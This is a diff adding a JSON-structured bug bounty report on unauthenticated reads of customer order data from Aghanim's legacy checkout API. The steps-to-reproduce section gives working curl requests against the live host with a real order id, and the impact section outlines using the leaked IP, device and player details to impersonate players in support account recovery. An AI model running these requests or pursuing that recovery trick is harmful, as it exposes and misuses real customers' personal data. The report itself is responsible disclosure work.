@@ -1,0 +1,205 @@
+{
+  "researcher": "Mr Fz",
+  "contact": "RESEARCHER_EMAIL",
+  "date_found": "2026-10-27",
+  "test_ip": "104.28.194.248",
+  "test_location": "Medan, Indonesia, Asia/Jakarta",
+  "title": "Unauthenticated access to third-party order data on the checkout API",
+  "subject": "Unauthenticated access to third-party order data on the Aghanim checkout API",
+  "target": "Aghanim (aghanim.com)",
+  "asset": "api.aghanim.com  (in scope: policy section 3.1.2)",
+  "endpoint": "GET /checkout/v1/orders/{order_id}",
+  "severity": "High",
+  "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "score": "7.5",
+  "cwe": "CWE-306 Missing Authentication for Critical Function / CWE-200 Exposure of Sensitive Information",
+  "policy": "https://support.aghanim.com/bounty-program",
+  "sections": [
+    {
+      "t": "h2",
+      "v": "Summary"
+    },
+    {
+      "t": "p",
+      "v": "The checkout front-end can talk to two API generations: the current one at <b>pay-api.aghanim.com/order/v1</b> and a legacy sibling at <b>api.aghanim.com/checkout/v1</b>. The order object is the same on both, but the legacy sibling exposes a method the current one does not."
+    },
+    {
+      "t": "p",
+      "v": "It answers 200 to an unauthenticated <b>GET /v1/orders/{order_id}</b> and returns the complete order object, including the customer IP address, the browser User-Agent, the in-game player identifier and the player display name. On the same object the current-generation API returns <b>405 Method Not Allowed</b>. The two hosts disagree about who may read an order, and the legacy path is the permissive one."
+    },
+    {
+      "t": "h2",
+      "v": "Affected request"
+    },
+    {
+      "t": "code",
+      "v": "GET /checkout/v1/orders/{order_id} HTTP/1.1\nHost: api.aghanim.com\n\nNo Authorization header, no cookie, no API key."
+    },
+    {
+      "t": "p",
+      "v": "Response: <b>HTTP/1.1 200 OK</b>, application/json, 6192 bytes for the order examined. The body carries 68 top-level keys. The sensitive ones are ip_address, user_agent, player_id, player_info.name, user_id and datahouse_user_id."
+    },
+    {
+      "t": "h2",
+      "v": "Steps to reproduce"
+    },
+    {
+      "t": "code",
+      "v": "STEP 1 - take an order id that is already published. The checkout URL is the\n         player-facing link, so it appears in search results, tickets and chats.\n         The one used here is indexed publicly as:\n\n         pay.aghanim.com/en/order/ord_eFnCYslSTNAhPSCm\n\n         Nothing was guessed and nothing was enumerated."
+    },
+    {
+      "t": "code",
+      "v": "STEP 2 - call the legacy API with no credentials:\n\n         curl -s -i https://api.aghanim.com/checkout/v1/orders/ord_eFnCYslSTNAhPSCm\n\n         -> 200 OK with ip_address, user_agent, player_id, player_info.name in the body"
+    },
+    {
+      "t": "code",
+      "v": "STEP 3 - the same id on the current generation:\n\n         curl -s -i https://pay-api.aghanim.com/order/v1/orders/ord_eFnCYslSTNAhPSCm\n\n         -> 405 Method Not Allowed   (this is the inconsistency)"
+    },
+    {
+      "t": "code",
+      "v": "STEP 4 - control, to show 200 is object-specific and not a catch-all:\n\n         curl -s -i https://api.aghanim.com/checkout/v1/orders/ord_AAAAAAAAAAAAAAAA\n\n         -> 404 Not Found"
+    },
+    {
+      "t": "p",
+      "v": "Reproduced three times, 8 to 10 seconds apart, identical each time: HTTP 200 with ip_address, user_agent and player_id present on every attempt."
+    },
+    {
+      "t": "pagebreak"
+    },
+    {
+      "t": "h2",
+      "v": "Evidence"
+    },
+    {
+      "t": "figure",
+      "n": "poc_unauth_order_pii.png",
+      "cap": "Figure 1. The four requests. Every value belonging to the customer is redacted here; no third-party data was written to disk at any point."
+    },
+    {
+      "t": "h2",
+      "v": "Impact"
+    },
+    {
+      "t": "p",
+      "v": "The order used belongs to a live, non-sandbox game (Westland Survival - Cowboy RPG) and the record holds a real customer IP address, a 111-character User-Agent string, and the in-game player identifier and display name. Anyone holding the order link can turn it into that customer profile."
+    },
+    {
+      "t": "p",
+      "v": "The practical use is account recovery against the game operator. Support staff ask a player to confirm identity, and player_id plus display name plus IP plus device fingerprint is what that check relies on. It also links one person across every game on the platform through datahouse_user_id. I did not attempt any recovery and I am not claiming account takeover: what is proved here is the disclosure."
+    },
+    {
+      "t": "h2",
+      "v": "Why policy 4.2.14 does not exclude this"
+    },
+    {
+      "t": "p",
+      "v": "Section 4.2.14 excludes findings that depend on guessing or enumerating resource identifiers. This one does not. The order id came from a public search result pointing at the vendor own player-facing URL, so it is published, not guessed. No enumeration was performed and no second order was read. The defect is the missing authorization check, not the shape of the identifier."
+    },
+    {
+      "t": "h2",
+      "v": "What I proved, and what I did not"
+    },
+    {
+      "t": "table",
+      "h": [
+        "Claim",
+        "Status"
+      ],
+      "rows": [
+        [
+          "Order readable with no credentials",
+          "Proved, 3 of 3 attempts, 200 each"
+        ],
+        [
+          "Body contains IP, User-Agent, player identity",
+          "Proved, present in every response"
+        ],
+        [
+          "Current-generation API refuses same object",
+          "Proved, 405 Method Not Allowed"
+        ],
+        [
+          "Identifier is published, not guessed",
+          "Proved, public search index of vendor URL"
+        ],
+        [
+          "Affects live, non-sandbox orders",
+          "Proved, sandbox=false on this order"
+        ],
+        [
+          "Account takeover via support recovery",
+          "NOT proved, argued only"
+        ],
+        [
+          "Bulk enumeration of many orders",
+          "NOT attempted, not needed"
+        ]
+      ],
+      "w": [
+        238,
+        273
+      ]
+    },
+    {
+      "t": "h2",
+      "v": "Suggested fix"
+    },
+    {
+      "t": "p",
+      "v": "Put the legacy <b>/checkout/v1/orders/{id}</b> route behind the authorization the current generation uses, or retire it. If a guest read is genuinely needed for checkout, return only what the page renders (item, amount, currency, status) and keep ip_address, user_agent and the player identity server-side. The same rule on player_info.name would remove the display name from an anonymous read as well."
+    },
+    {
+      "t": "h2",
+      "v": "Programme compliance"
+    },
+    {
+      "t": "table",
+      "h": [
+        "Requirement (policy v2026-08-24)",
+        "How this report meets it"
+      ],
+      "rows": [
+        [
+          "Scope, section 3.1.2 host list",
+          "api.aghanim.com is listed"
+        ],
+        [
+          "Section 5.3.5 PII exposure",
+          "The category reported here"
+        ],
+        [
+          "Section 7.1 use own accounts",
+          "No account used, none created"
+        ],
+        [
+          "Section 7.3 throttle tools",
+          "Four manual requests, no scanning"
+        ],
+        [
+          "Section 7.5 sensitive data",
+          "Stopped on sight, retained nothing, values redacted"
+        ],
+        [
+          "Section 7.6 no side effects",
+          "GET requests only, nothing modified"
+        ],
+        [
+          "Section 8.2 report contents",
+          "Description, steps, PoC, impact, fix"
+        ],
+        [
+          "Section 13 no public disclosure",
+          "Not disclosed anywhere"
+        ]
+      ],
+      "w": [
+        238,
+        273
+      ]
+    },
+    {
+      "t": "small",
+      "v": "Contact: Mr Fz, RESEARCHER_EMAIL"
+    }
+  ]
+}
